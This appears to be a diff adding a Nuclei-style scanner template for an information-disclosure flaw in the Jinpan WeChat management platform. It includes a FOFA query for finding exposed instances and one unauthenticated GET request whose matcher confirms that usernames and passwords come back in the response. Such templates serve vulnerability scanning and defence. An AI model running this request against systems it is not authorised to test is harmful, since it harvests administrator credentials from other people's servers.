@@ -1,0 +1,30 @@
+id: jinpan-weichatcfg-disclosure
+
+info:
+  name: 金盘微信管理平台 getsysteminfo信息泄露
+  author: SleepingBag945
+  severity: high
+  description: |
+    FOFA: icon_hash="116323821" && title=="微信管理后台"
+  tags: jinpan
+
+
+http:
+  - raw:
+      - |
+        GET /admin/weichatcfg/getsysteminfo HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        part: status_code
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"id":1,'
+          - '"username":'
+          - '"password":'
+        condition: and
